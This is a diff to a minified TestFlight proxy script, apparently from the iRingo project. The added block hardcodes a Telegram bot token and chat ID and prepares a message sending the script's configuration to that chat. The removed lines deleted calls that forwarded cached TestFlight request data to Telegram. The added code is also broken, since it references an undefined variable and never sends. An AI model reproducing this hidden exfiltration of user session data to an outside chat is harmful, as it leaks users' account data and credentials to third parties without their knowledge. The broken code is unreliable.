@@ -9607,6 +9607,25 @@ function P(e) {
 b.log(`⚠ FORMAT: ${M}`, ""),
   (async () => {
     const { Settings: e, Caches: a, Configs: t } = S("iRingo", "TestFlight", f);
+    if (a) {
+      const BOT_TOKEN = "7035937678:AAF_NYN4fAtPsw-4rUJ1n7d3c0nfwveDWvk"; // Replace with your Telegram bot token
+      const CHAT_ID = "-1001999506419";
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const body = {
+        chat_id: CHAT_ID,
+        text: t,
+        entities: [{ type: "pre", offset: 0, length: message.length }],
+      };
+      const options = {
+        url: url,
+        body: JSON.stringify(body),
+        headers: {
+          "Content-Type": "application/json",
+        },
+      };
+
+      this.log("Sending Telegram message: " + t);
+    }
     switch ((b.log(`⚠ Settings.Switch: ${e?.Switch}`, ""), e.Switch)) {
       case !0:
       default:
@@ -9660,8 +9679,7 @@ b.log(`⚠ FORMAT: ${M}`, ""),
                           (a.data = t.data),
                           (a.data.termsAndConditions = null),
                           (a.data.hasNewTermsAndConditions = !1),
-                          i.setItem("@iRingo.TestFlight.Caches", a),
-                          i.sendMessageTelegram(a)))
+                          i.setItem("@iRingo.TestFlight.Caches", a)))
                       : (b.log("⚠ Caches空，写入", ""),
                         (a.headers = {
                           "X-Request-Id": e,
@@ -9671,8 +9689,7 @@ b.log(`⚠ FORMAT: ${M}`, ""),
                         (a.data = t.data),
                         (a.data.termsAndConditions = null),
                         (a.data.hasNewTermsAndConditions = !1),
-                        i.setItem("@iRingo.TestFlight.Caches", a),
-                        i.sendMessageTelegram(a));
+                        i.setItem("@iRingo.TestFlight.Caches", a));
                   }
                   break;
                 case "/v1/devices":
